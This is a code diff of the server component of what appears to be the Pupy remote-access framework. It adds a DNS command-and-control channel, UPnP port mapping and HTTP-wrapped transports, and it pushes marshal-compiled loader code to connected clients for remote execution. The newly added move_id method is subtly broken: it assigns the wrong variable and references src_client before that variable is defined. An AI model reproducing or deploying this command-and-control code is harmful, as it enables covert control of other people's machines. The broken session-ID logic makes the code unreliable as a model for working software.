@@ -21,74 +21,137 @@ import modules
 import logging
 from .PupyErrors import PupyModuleExit, PupyModuleError
 from .PupyJob import PupyJob
-from .PupyCmd import color_real
 from .PupyCategories import PupyCategories
+from .PupyConfig import PupyConfig
+from .PupyService import PupyBindService
 from network.conf import transports
+from network.lib.connection import PupyConnectionThread
 from pupylib.utils.rpyc_utils import obtain
+from pupylib.PupyDnsCnc import PupyDnsCnc
 from .PupyTriggers import on_connect
 from network.lib.utils import parse_transports_args
+from network.lib.base import chain_transports
+from network.lib.transports.httpwrap import PupyHTTPWrapperServer
 from network.lib.base_launcher import LauncherError
+from network.lib.igd import IGDClient, UPNPError
 from os import path
 from shutil import copyfile
+from itertools import count, ifilterfalse
 import marshal
 import network.conf
 import rpyc
 import shlex
-
-try:
-    import ConfigParser as configparser
-except ImportError:
-    import configparser
+import socket
+import errno
 from . import PupyClient
 import os.path
 
 class PupyServer(threading.Thread):
-    def __init__(self, transport, transport_kwargs, port=None, ipv6=None):
+    def __init__(self, transport, transport_kwargs, port=None, config=None):
         super(PupyServer, self).__init__()
-        self.daemon=True
-        self.server=None
-        self.authenticator=None
-        self.clients=[]
-        self.jobs={}
-        self.jobs_id=1
-        self.clients_lock=threading.Lock()
-        self.current_id=1
-        self.config = configparser.ConfigParser()
-        if not path.exists('pupy.conf'):
-            copyfile(
-                path.join(
-                    path.dirname(__file__), '..', 'pupy.conf.default'
-                ),
-            'pupy.conf')
-        self.config.read("pupy.conf")
-        if port is None:
-            self.port=self.config.getint("pupyd", "port")
+        self.daemon = True
+        self.server = None
+        self.authenticator = None
+        self.httpd = None
+        self.clients = []
+        self.jobs = {}
+        self.jobs_id = 1
+        self.clients_lock = threading.Lock()
+        self._current_id = []
+        self._current_id_lock = threading.Lock()
+
+        self.config = config or PupyConfig()
+        self.port = port or self.config.getint('pupyd', 'port')
+        self.address = self.config.getip('pupyd', 'address') or ''
+        if self.address:
+            self.ipv6 = self.address.version == 6
         else:
-            self.port=port
-        if ipv6 is None:
-            self.ipv6=self.config.getboolean("pupyd", "ipv6")
-        else:
-            self.ipv6=ipv6
+            self.ipv6 = self.config.getboolean('pupyd', 'ipv6')
+
+        transport_args = (
+            transport or self.config.get('pupyd', 'transport')
+        ).split(' ', 1)
+
+        self.transport = transport_args[0]
+        self.transport_kwargs = transport_args[1] if len(transport_args) > 1 else None
+
+        self.handler = None
+        self.handler_registered = threading.Event()
+        self.transport_kwargs = transport_kwargs
+        self.categories = PupyCategories(self)
+        self.igd = None
+        self.finished = threading.Event()
+        self._cleanups = []
+        self._singles = {}
+
+        if self.config.getboolean('pupyd', 'httpd'):
+            self.httpd = True
+
         try:
-            self.address=self.config.get("pupyd", "address")
-            if self.ipv6 and not ":" in self.address:
-                logging.warning("ipv4 detected in pupy.conf, only binding on ipv4")
-                self.ipv6=False
-        except configparser.NoOptionError:
-            self.address=''
-        if not transport:
+            self.igd = IGDClient(
+                available=config.getboolean('pupyd', 'igd')
+            )
+        except UPNPError as e:
+            pass
+
+        self.dnscnc = None
+
+        dnscnc = self.config.get('pupyd', 'dnscnc')
+        if dnscnc and not dnscnc.lower() in ('no', 'false', 'stop', 'n', 'disable'):
+            if ':' in dnscnc:
+                fdqn, dnsport = dnscnc.split(':')
+            else:
+                fdqn = dnscnc.strip()
+                dnsport = 5454
+
+            self.dnscnc = PupyDnsCnc(
+                fdqn,
+                igd=self.igd,
+                port=dnsport,
+                connect_port=self.port,
+                connect_transport=self.transport,
+                config=self.config
+            )
+
+
+    def create_id(self):
+        """ return first lowest unused session id """
+        with self._current_id_lock:
+            new_id = next(ifilterfalse(self._current_id.__contains__, count(1)))
+            self._current_id.append(new_id)
+            return new_id
+
+    def move_id(self, dst_id, src_id):
+        """ return first lowest unused session id """
+        with self.clients_lock:
+            if isinstance(dst_id, int):
+                dst_client = [ x for x in self.clients if x.desc['id'] == dst_id ]
+                if not dst_client:
+                    raise ValueError('Client with id {} not found'.format(dst_id))
+                dst_client = dst_client[0]
+            else:
+                dst_client = dst_id
+
+            if isinstance(src_id, int):
+                dst_client = [ x for x in self.clients if x.desc['id'] == src_id ]
+                if not src_client:
+                    raise ValueError('Client with id {} not found'.format(src_id))
+                src_client = src_client[0]
+            else:
+                src_client = src_id
+
+            with self._current_id_lock:
+                self._current_id.remove(dst_client.desc['id'])
+                self._current_id.append(src_client.desc['id'])
+
+            dst_client.desc['id'] = src_client.desc['id']
+
+    def free_id(self, id):
+        with self._current_id_lock:
             try:
-                self.transport=self.config.get("pupyd", "transport")
-                if ' ' in self.transport:
-                    self.transport, self.transport_kwargs = self.transport.split(' ', 1)
-            except configparser.NoOptionError:
-                self.transport='ssl'
-        else:
-            self.transport = transport
-        self.handler=None
-        self.handler_registered=threading.Event()
-        self.transport_kwargs=transport_kwargs
-        self.categories=PupyCategories(self)
+                self._current_id.remove(int(id))
+            except ValueError:
+                logging.debug('Id not found in current_id list: {}'.format(id))
 
     def register_handler(self, instance):
         """ register the handler instance, typically a PupyCmd, and PupyWeb in the futur"""
@@ -97,7 +160,7 @@ class PupyServer(threading.Thread):
 
     def add_client(self, conn):
         pc=None
-        with open(path.join(path.dirname(__file__), 'PupyClientInitializer.py')) as initializer:
+        with open(path.join(self.config.root, 'pupylib', 'PupyClientInitializer.py')) as initializer:
             conn.execute(
                 'import marshal;exec marshal.loads({})'.format(
                     repr(marshal.dumps(compile(initializer.read(), '<loader>', 'exec')))
@@ -107,40 +170,49 @@ class PupyServer(threading.Thread):
         l=conn.namespace["get_uuid"]()
 
         with self.clients_lock:
+            client_id = self.create_id()
             client_info = {
-                "id": self.current_id,
+                "id": client_id,
                 "conn" : conn,
                 "address" : conn._conn._config['connid'].rsplit(':',1)[0],
-                "launcher" : conn.get_infos("launcher"),
-                "launcher_args" : obtain(conn.get_infos("launcher_args")),
-                "transport" : obtain(conn.get_infos("transport")),
-                "daemonize" : (True if obtain(conn.get_infos("daemonize")) else False),
+                "launcher" : str(conn.get_infos("launcher")),
+                "launcher_args" : [ x for x in conn.get_infos("launcher_args") ],
+                "transport" : str(conn.get_infos("transport")),
+                "daemonize" : bool(conn.get_infos("daemonize")),
+                "native": bool(conn.get_infos("native")),
             }
             client_info.update(l)
             pc=PupyClient.PupyClient(client_info, self)
             self.clients.append(pc)
             if self.handler:
                 addr = conn.modules['pupy'].get_connect_back_host()
-                server_ip, server_port = addr.rsplit(':', 1)
                 try:
                     client_ip, client_port = conn._conn._config['connid'].rsplit(':', 1)
                 except:
                     client_ip, client_port = "0.0.0.0", 0 # TODO for bind payloads
 
-                self.handler.display_srvinfo("Session {} opened ({}:{} <- {}:{})".format(
-                    self.current_id, server_ip, server_port, client_ip, client_port))
-            self.current_id += 1
+                self.handler.display_srvinfo("Session {} opened ({}{}:{})".format(
+                    client_id,
+                    '{} <- '.format(addr) if not '0.0.0.0' in addr else '',
+                    client_ip, client_port)
+                )
         if pc:
             on_connect(pc)
 
-    def remove_client(self, client):
+    def remove_client(self, conn):
         with self.clients_lock:
-            for i,c in enumerate(self.clients):
-                if c.conn is client:
-                    if self.handler:
-                        self.handler.display_srvinfo('Session {} closed'.format(self.clients[i].desc['id']))
-                    del self.clients[i]
-                    break
+            client = [ x for x in self.clients if ( x.conn is conn or x is conn ) ]
+            if not client:
+                logging.debug('No clients matches request: {}'.format(conn))
+                return
+
+            client = client[0]
+
+            self.clients.remove(client)
+            self.free_id(client.desc['id'])
+
+            if self.handler:
+                self.handler.display_srvinfo('Session {} closed'.format(client.desc['id']))
 
     def get_clients(self, search_criteria):
         """ return a list of clients corresponding to the search criteria. ex: platform:*win* """
@@ -269,16 +341,33 @@ class PupyServer(threading.Thread):
         except LauncherError as e:
             launcher.arg_parser.print_usage()
             return
-        stream=launcher.iterate().next()
-        self.handler.display_info("Connecting ...")
-        conn=rpyc.utils.factory.connect_stream(stream, PupyService.PupyBindService, {})
-        bgsrv=rpyc.BgServingThread(conn)
-        bgsrv.SLEEP_INTERVAL=0.001 # consume ressources but faster response ...
 
+        try:
+            stream=launcher.iterate().next()
+        except socket.error as e:
+            self.handler.display_error("Couldn't connect to pupy: {}".format(e))
+            return
+
+        self.handler.display_success("Connected. Starting session")
+        bgsrv=PupyConnectionThread(
+            self,
+            PupyBindService,
+            rpyc.Channel(stream),
+            config={
+                'connid': launcher.args.host
+            })
+        bgsrv.start()
 
     def run(self):
         self.handler_registered.wait()
-        t=transports[self.transport]()
+        t = transports[self.transport]()
+
+        if self.httpd:
+            t.server_transport = chain_transports(
+                PupyHTTPWrapperServer.custom(server=self),
+                t.server_transport
+            )
+
         transport_kwargs=t.server_transport_kwargs
         if self.transport_kwargs:
             opt_args=parse_transports_args(self.transport_kwargs)
@@ -297,7 +386,47 @@ class PupyServer(threading.Thread):
             logging.exception(e)
 
         try:
-            self.server = t.server(PupyService.PupyService, port = self.port, hostname=self.address, authenticator=authenticator, stream=t.stream, transport=t.server_transport, transport_kwargs=t.server_transport_kwargs, ipv6=self.ipv6)
+            self.server = t.server(
+                PupyService,
+                port=self.port, hostname=self.address,
+                authenticator=authenticator,
+                stream=t.stream,
+                transport=t.server_transport,
+                transport_kwargs=t.server_transport_kwargs,
+                pupy_srv=self,
+                ipv6=self.ipv6,
+                igd=self.igd
+            )
+
             self.server.start()
+        except socket.error as e:
+            if e.errno == errno.EACCES:
+                logging.error('Insufficient privileges to bind on port {}'.format(self.port))
+            else:
+                logging.exception(e)
         except Exception as e:
             logging.exception(e)
+        finally:
+            self.finished.set()
+
+    def register_cleanup(self, cleanup):
+        self._cleanups.append(cleanup)
+
+    def single(self, ctype, *args, **kwargs):
+        single = self._singles.get(ctype)
+        if not single:
+            single = ctype(*args, **kwargs)
+            self._singles[ctype] = single
+
+        return single
+
+    def stop(self):
+        for cleanup in self._cleanups:
+            cleanup()
+
+        self._cleanups = []
+
+        if self.server:
+            self.server.close()
+
+        self.finished.set()
